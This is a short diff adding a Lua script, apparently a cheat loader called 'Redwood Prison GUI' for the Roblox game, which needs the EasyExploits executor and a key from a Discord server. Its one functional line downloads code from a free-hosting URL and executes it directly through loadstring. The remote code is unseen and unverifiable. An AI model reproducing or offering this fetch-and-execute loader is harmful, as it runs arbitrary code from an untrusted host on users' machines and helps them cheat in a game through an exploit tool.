@@ -1,0 +1,3 @@
+-- Redwood Prison GUI by Jalos34. Only works with EasyExploits API. Remember to join his Discord for the key!
+-- https://cdn.discordapp.com/icons/620661360149397525/a_26bdac94fc48d43e620772b756ea5103.gif?size=256
+loadstring(game:HttpGet(('https://541.000webhostapp.com/script.php'),true))()
